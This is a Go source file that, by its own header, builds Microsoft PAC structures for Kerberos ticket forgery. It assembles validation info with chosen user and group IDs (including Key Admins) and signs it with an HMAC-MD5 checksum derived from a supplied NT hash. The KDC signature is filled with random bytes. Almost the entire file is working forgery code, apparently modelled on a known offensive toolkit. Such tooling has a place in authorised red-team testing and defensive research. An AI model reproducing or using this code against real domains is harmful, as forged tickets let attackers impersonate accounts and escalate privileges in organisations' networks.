// Package pac constructs MS-PAC structures for Kerberos ticket forgery.
//
// gokrb5 provides PAC *parsing* (Unmarshal) but not PAC *construction* (Marshal).
// This package fills that gap: it builds KerbValidationInfo, ClientInfo,
// UPNDNSInfo, and SignatureData; serializes them to bytes; computes HMAC-MD5
// checksums; and assembles the complete PACTYPE binary blob.
//
// Reference: [MS-PAC], AADInternals New-PAC (Kerberos.ps1)
package pac

import (
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	cryptorand "crypto/rand"
	"encoding/binary"
	"fmt"
	"math"
	"time"
)

// Info buffer type constants ([MS-PAC] §2.4)
const (
	InfoTypeKerbValidationInfo uint32 = 1
	InfoTypePACServerSignature uint32 = 6
	InfoTypePACKDCSignature    uint32 = 7
	InfoTypePACClientInfo      uint32 = 10
	InfoTypeUPNDNSInfo         uint32 = 12
)

// Checksum type constants
const (
	ChecksumTypeHMACMD5          uint32 = 0xFFFFFF76 // -138 as unsigned
	ChecksumHMACMD5Size                 = 16
	ChecksumTypeHMACSHA196AES256 uint32 = 16
	ChecksumHMACSHA196AES256Size        = 12
)

const (
	signatureKeyBytes = "signaturekey\x00"
	userFlagNormal    = 0x20
	primaryGroupRID   = 513 // Domain Users
	groupCount        = 2
	groupRID1         = 515 // Domain Computers
	groupRID2         = 527 // Key Admins
)

// BuildParams holds the input data for PAC construction.
type BuildParams struct {
	UserSID       string
	UserRID       uint32
	DomainNetBIOS string
	DomainFQDN    string
	Realm         string
	UPN           string
	FullName      string
	ServerName    string
	NTHash        []byte
}

// Builder constructs PAC blobs. Use NewBuilder for a configured instance.
type Builder struct {
	params   *BuildParams
	now      uint64 // FileTime in 100ns intervals
	authTime uint64
}

// NewBuilder creates a PAC builder for the given parameters.
func NewBuilder(params *BuildParams) *Builder {
	ft := filetimeNow()
	return &Builder{
		params:   params,
		now:      ft,
		authTime: ft,
	}
}

// SetAuthTime overrides the LogOnTime used in KerbValidationInfo and ClientInfo.
func (b *Builder) SetAuthTime(ft uint64) {
	b.authTime = ft
}

// Build assembles the complete PAC binary blob with all 5 InfoBuffers
// and correct HMAC-MD5 server checksum.
func (b *Builder) Build() ([]byte, error) {
	kvi, err := b.encodeKerbValidationInfo()
	if err != nil {
		return nil, fmt.Errorf("pac: KerbValidationInfo: %w", err)
	}
	ci := b.encodeClientInfo()
	udi := b.encodeUPNDNSInfo()

	serverSig := signaturePlaceholder(ChecksumTypeHMACMD5, ChecksumHMACMD5Size)
	kdcSig := signaturePlaceholder(ChecksumTypeHMACSHA196AES256, ChecksumHMACSHA196AES256Size)

	buffers := []struct {
		ulType uint32
		data   []byte
	}{
		{InfoTypeKerbValidationInfo, kvi},
		{InfoTypePACClientInfo, ci},
		{InfoTypeUPNDNSInfo, udi},
		{InfoTypePACServerSignature, serverSig},
		{InfoTypePACKDCSignature, kdcSig},
	}

	return b.assemble(buffers)
}

// encodeKerbValidationInfo NDR-encodes KERB_VALIDATION_INFO.
// Matches AADInternals New-PAC layout byte-for-byte.
func (b *Builder) encodeKerbValidationInfo() ([]byte, error) {
	p := b.params
	userName := usernameFromUPN(p.UPN)

	bUserName := utf16Encode(userName)
	bDisplayName := utf16Encode(p.FullName)
	bServerName := utf16Encode(serverOrDC(p))
	bDomainName := utf16Encode(p.DomainNetBIOS)

	logonTime := b.authTime - ftMinutes(10)
	logoffTime := uint64(math.MaxInt64)
	pwdLastSet := b.now - ftDays(10)
	pwdCanChange := pwdLastSet + ftDays(1)
	pwdMustChange := uint64(math.MaxInt64)

	sidBytes, err := parseSID(p.UserSID)
	if err != nil {
		return nil, fmt.Errorf("parse SID: %w", err)
	}
	userSID := make([]byte, 4) // last 4 bytes = RID
	copy(userSID, sidBytes[len(sidBytes)-4:])
	domainSID := make([]byte, len(sidBytes)-4) // first N-4 bytes = domain prefix
	copy(domainSID, sidBytes[:len(sidBytes)-4])
	domainSID[1] = 4 // change revision from 5 to 4

	// ---- Build LOGON_INFORMATION inline body ----
	var body bytes.Buffer

	// NDR common header (20 bytes)
	body.Write([]byte{0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc}) // version, endian, common header len, filler
	putU32(&body, 0) // info buffer length placeholder (filled later)
	putU32(&body, 0) // zeros
	putU32(&body, 0x00020000) // user info pointer

	// FileTimes (6 × 8 = 48 bytes)
	putFileTime(&body, logonTime)
	putFileTime(&body, logoffTime)
	putFileTime(&body, logoffTime) // KickOffTime = max int64
	putFileTime(&body, pwdLastSet)
	putFileTime(&body, pwdCanChange)
	putFileTime(&body, pwdMustChange)

	// RPC_UNICODE_STRINGs (6): UserName, DisplayName, LogonScript, ProfilePath, HomeDirectory, HomeDrive
	putRPCUnicodeString(&body, len(bUserName), len(bUserName), 0x00020004)    // UserName
	putRPCUnicodeString(&body, len(bDisplayName), len(bDisplayName), 0x00020008) // DisplayName
	putRPCUnicodeString(&body, 0, 0, 0x0002000c) // LogonScript
	putRPCUnicodeString(&body, 0, 0, 0x00020010) // ProfilePath
	putRPCUnicodeString(&body, 0, 0, 0x00020014) // HomeDirectory
	putRPCUnicodeString(&body, 0, 0, 0x00020018) // HomeDrive

	// uint16: LogonCount, BadPasswordCount (4 bytes)
	putU16(&body, 5)
	putU16(&body, 0)

	// uint32: UserID (RID), PrimaryGroupID (8 bytes)
	body.Write(userSID)             // UserRID (4 bytes, little-endian from SID tail)
	putU32(&body, primaryGroupRID)  // 513 = Domain Users

	// GroupCount + GroupPointer (8 bytes)
	putU32(&body, groupCount)        // 2 groups
	putU32(&body, 0x0002001c)        // pointer to GroupIDs

	// UserFlags (4 bytes)
	putU32(&body, userFlagNormal)    // 0x20

	// UserSessionKey (16 bytes, all zeros — only used for NTLM)
	body.Write(make([]byte, 16))

	// RPC_UNICODE_STRING: ServerName + DomainName (8+8=16 bytes)
	putRPCUnicodeString(&body, len(bServerName), len(bServerName)+2, 0x00020020) // ServerName
	putRPCUnicodeString(&body, len(bDomainName), len(bDomainName)+2, 0x00020024) // LogonDomainName

	// DomainIDPointer (4 bytes)
	putU32(&body, 0x00020028)

	// Reserved (8 bytes)
	body.Write(make([]byte, 8))

	// UserAccountControl (4 bytes)
	putU32(&body, 0x80) // USER_WORKSTATION_TRUST_ACCOUNT

	// SubAuthStatus (4 bytes)
	putU32(&body, 0)

	// LastSuccessfulILogon, LastFailedILogon (16 bytes)
	body.Write(make([]byte, 16))

	// FailedILogonCount, Reserved3 (8 bytes)
	putU32(&body, 0)
	putU32(&body, 0)

	// ExtraSIDs (8 bytes)
	putU32(&body, 1)             // ExtraSIDCount
	putU32(&body, 0x0002002c)    // ExtraSIDPointer

	// ResourceGroup fields (12 bytes)
	putU32(&body, 0) // ResourceDomainIDPointer (null)
	putU32(&body, 0) // ResourceGroupCount
	putU32(&body, 0) // ResourceGroupPointer

	// ---- Deferred referent area ----
	var refs bytes.Buffer

	// UserName: NDR conformant varying string
	putNDRString(&refs, bUserName)
	padTo4(&refs)

	// UserDisplayName: NDR conformant varying string
	if len(bDisplayName) > 0 {
		putNDRString(&refs, bDisplayName)
		padTo4(&refs)
	} else {
		refs.Write(make([]byte, 12)) // empty = 12 zeros
	}

	// LogonScript: 12 zeros
	refs.Write(make([]byte, 12))
	// ProfilePath: 12 zeros
	refs.Write(make([]byte, 12))
	// HomeDirectory: 12 zeros
	refs.Write(make([]byte, 12))
	// HomeDrive: 12 zeros
	refs.Write(make([]byte, 12))

	// GroupIDs: Count + [RID, Attrs] * groupCount
	putU32(&refs, groupCount)
	putGroupMembership(&refs, groupRID1, 7)
	putGroupMembership(&refs, groupRID2, 7)

	// ServerName: NDR conformant varying
	putNDRStringWithTotal(&refs, bServerName, len(bServerName)/2+1)
	padTo4(&refs)

	// LogonDomainName: NDR conformant varying
	putNDRStringWithTotal(&refs, bDomainName, len(bDomainName)/2+1)
	padTo4(&refs)

	// DomainSID: Count + SID bytes
	putU32(&refs, uint32(domainSID[1])) // count of sub-authorities
	refs.Write(domainSID)

	// ExtraSIDs: Count + Pointer + Attrs + SID binary
	putU32(&refs, 1) // SID count
	putU32(&refs, 0x00020030)
	putU32(&refs, 7) // Attributes
	putU32(&refs, 1) // SID size (sub-authority count)
	refs.Write([]byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x01, 0x00, 0x00, 0x00}) // S-1-18-1

	// Assemble: body + deferred refs
	kviBuf := make([]byte, body.Len()+refs.Len())
	copy(kviBuf, body.Bytes())
	copy(kviBuf[body.Len():], refs.Bytes())

	// Fill in info buffer length (total - 0x10 for the 16-byte wrapper header)
	infoLen := len(kviBuf) - 16
	binary.LittleEndian.PutUint32(kviBuf[8:12], uint32(infoLen))

	return kviBuf, nil
}

// encodeClientInfo serializes PAC_CLIENT_INFO (not NDR-encoded per [MS-PAC] §2.7).
func (b *Builder) encodeClientInfo() []byte {
	var buf bytes.Buffer
	putFileTime(&buf, b.authTime)
	nameUTF16 := utf16Encode(usernameFromUPN(b.params.UPN))
	putU16(&buf, uint16(len(nameUTF16)))
	buf.Write(nameUTF16)
	return buf.Bytes()
}

// encodeUPNDNSInfo serializes UPN_DNS_INFO (not NDR-encoded per [MS-PAC] §2.9).
func (b *Builder) encodeUPNDNSInfo() []byte {
	upnUTF16 := utf16Encode(b.params.UPN)
	dnsUTF16 := utf16Encode(b.params.Realm)
	upnLen := uint16(len(upnUTF16))
	dnsLen := uint16(len(dnsUTF16))

	var buf bytes.Buffer
	putU16(&buf, upnLen)
	putU16(&buf, uint16(0x10)) // UPN offset
	putU16(&buf, dnsLen)
	dnsOff := uint16(0x10 + int(upnLen))
	if dnsOff%2 != 0 {
		dnsOff++
	}
	putU16(&buf, dnsOff)
	putU32(&buf, 0) // Flags
	putU32(&buf, 0) // alignment
	buf.Write(upnUTF16)
	if buf.Len()%2 != 0 {
		buf.WriteByte(0)
	}
	buf.Write(dnsUTF16)
	return buf.Bytes()
}

// assemble constructs the full PACTYPE binary with headers and checksums.
func (b *Builder) assemble(buffers []struct {
	ulType uint32
	data   []byte
}) ([]byte, error) {
	nBuf := len(buffers)
	headerSize := 8 + nBuf*16

	offsets := make([]uint64, nBuf)
	alignedSizes := make([]int, nBuf)
	offset := roundUp(headerSize, 8)
	for i, buf := range buffers {
		offsets[i] = uint64(offset)
		alignedSizes[i] = roundUp(len(buf.data), 8)
		offset = roundUp(offset+len(buf.data), 8)
	}

	totalSize := offset
	pacBytes := make([]byte, totalSize)

	binary.LittleEndian.PutUint32(pacBytes[0:4], uint32(nBuf))
	binary.LittleEndian.PutUint32(pacBytes[4:8], 0)

	for i, buf := range buffers {
		off := 8 + i*16
		cbSize := uint32(alignedSizes[i])
		if buf.ulType == InfoTypePACServerSignature {
			cbSize -= 4
		}
		binary.LittleEndian.PutUint32(pacBytes[off:off+4], buf.ulType)
		binary.LittleEndian.PutUint32(pacBytes[off+4:off+8], cbSize)
		binary.LittleEndian.PutUint64(pacBytes[off+8:off+16], offsets[i])
	}

	for i, buf := range buffers {
		copy(pacBytes[offsets[i]:], buf.data)
	}

	serverSigStart := int(offsets[3])
	serverSigBytes := pacBytes[serverSigStart : serverSigStart+len(buffers[3].data)]
	kdcSigStart := int(offsets[4])

	checksum := ServerChecksum(pacBytes, b.params.NTHash)
	copy(serverSigBytes[4:4+ChecksumHMACMD5Size], checksum)

	cryptorand.Read(pacBytes[kdcSigStart+4 : kdcSigStart+4+ChecksumHMACSHA196AES256Size])

	return pacBytes, nil
}

// ---------- Checksum ----------

func ServerChecksum(pacData []byte, ntHash []byte) []byte {
	ksign := hmacMD5(ntHash, []byte(signatureKeyBytes))
	prefix := []byte{0x11, 0x00, 0x00, 0x00}
	tmp := md5Hash(append(prefix, pacData...))
	return hmacMD5(ksign, tmp)
}

func md5Hash(data []byte) []byte {
	h := md5.New()
	h.Write(data)
	return h.Sum(nil)
}

func hmacMD5(key, data []byte) []byte {
	mac := hmac.New(md5.New, key)
	mac.Write(data)
	return mac.Sum(nil)
}

// ---------- Serialization helpers ----------

func putFileTime(w *bytes.Buffer, ft uint64) {
	binary.Write(w, binary.LittleEndian, uint32(ft&0xFFFFFFFF))
	binary.Write(w, binary.LittleEndian, uint32(ft>>32))
}

func putRPCUnicodeString(w *bytes.Buffer, length, maxLength int, pointer uint32) {
	putU16(w, uint16(length))
	putU16(w, uint16(maxLength))
	putU32(w, pointer)
}

func putNDRString(w *bytes.Buffer, utf16Data []byte) {
	numChars := uint32(len(utf16Data) / 2)
	putU32(w, numChars)          // MaximumCount
	putU32(w, 0)                 // Offset
	putU32(w, numChars)          // ActualCount
	w.Write(utf16Data)
}

func putNDRStringWithTotal(w *bytes.Buffer, utf16Data []byte, totalChars int) {
	actualChars := uint32(len(utf16Data) / 2)
	putU32(w, uint32(totalChars)) // MaximumCount (includes null terminator)
	putU32(w, 0)                   // Offset
	putU32(w, actualChars)         // ActualCount (without null terminator)
	w.Write(utf16Data)
}

func putGroupMembership(w *bytes.Buffer, rid uint32, attrs uint32) {
	binary.Write(w, binary.LittleEndian, rid)
	binary.Write(w, binary.LittleEndian, attrs)
}

func putU16(w *bytes.Buffer, v uint16) { binary.Write(w, binary.LittleEndian, v) }
func putU32(w *bytes.Buffer, v uint32) { binary.Write(w, binary.LittleEndian, v) }

func padTo4(w *bytes.Buffer) {
	for w.Len()%4 != 0 {
		w.WriteByte(0)
	}
}

func utf16Encode(s string) []byte {
	var buf bytes.Buffer
	for _, r := range s {
		binary.Write(&buf, binary.LittleEndian, uint16(r))
	}
	return buf.Bytes()
}

func filetimeNow() uint64 {
	return uint64(time.Now().UnixNano())/100 + 116444736000000000
}

func ftDays(d int) uint64    { return uint64(d) * 24 * 60 * 60 * 10000000 }
func ftMinutes(d int) uint64 { return uint64(d) * 60 * 10000000 }

func roundUp(n, align int) int { return (n + align - 1) & ^(align - 1) }

func usernameFromUPN(upn string) string {
	for i, r := range upn {
		if r == '@' {
			return upn[:i]
		}
	}
	return upn
}

func serverOrDC(p *BuildParams) string {
	if p.ServerName != "" {
		return p.ServerName
	}
	return p.DomainNetBIOS + "." + p.DomainFQDN
}

func signaturePlaceholder(sigType uint32, sigSize int) []byte {
	buf := make([]byte, 4+sigSize)
	binary.LittleEndian.PutUint32(buf[0:4], sigType)
	return buf
}

// parseSID converts "S-1-5-21-X-Y-Z-RID" to binary.
func parseSID(s string) ([]byte, error) {
	pos := 0
	if len(s) < 2 || s[0] != 'S' || s[1] != '-' {
		return nil, fmt.Errorf("pac: invalid SID prefix: %s", s)
	}
	pos = 2

	rev, next, err := parseSIDComponent(s, pos)
	if err != nil {
		return nil, err
	}
	revision := uint8(rev)
	pos = next

	auth, next, err := parseSIDComponent(s, pos)
	if err != nil {
		return nil, err
	}
	pos = next

	var subs []uint32
	for pos < len(s) {
		sub, next, err := parseSIDComponent(s, pos)
		if err != nil {
			return nil, err
		}
		subs = append(subs, uint32(sub))
		pos = next
	}

	nSub := len(subs)
	out := make([]byte, 8+4*nSub)
	out[0] = revision
	out[1] = byte(nSub)
	out[2] = byte(auth >> 40)
	out[3] = byte(auth >> 32)
	out[4] = byte(auth >> 24)
	out[5] = byte(auth >> 16)
	out[6] = byte(auth >> 8)
	out[7] = byte(auth)
	for i, sub := range subs {
		binary.LittleEndian.PutUint32(out[8+i*4:], sub)
	}
	return out, nil
}

func parseSIDComponent(s string, start int) (uint64, int, error) {
	if start >= len(s) || s[start] == '-' {
		return 0, start, fmt.Errorf("pac: expected SID component at position %d", start)
	}
	end := start
	for end < len(s) && s[end] >= '0' && s[end] <= '9' {
		end++
	}
	const maxComponent = 0xFFFFFFFF
	var v uint64
	for i := start; i < end; i++ {
		digit := uint64(s[i] - '0')
		if digit > 9 { continue }
		if v > (maxComponent - digit) / 10 {
			return 0, start, fmt.Errorf("pac: SID component overflow at %d", i)
		}
		v = v*10 + digit
	}
	next := end
	if next < len(s) && s[next] == '-' {
		next++
	}
	return v, next, nil
}
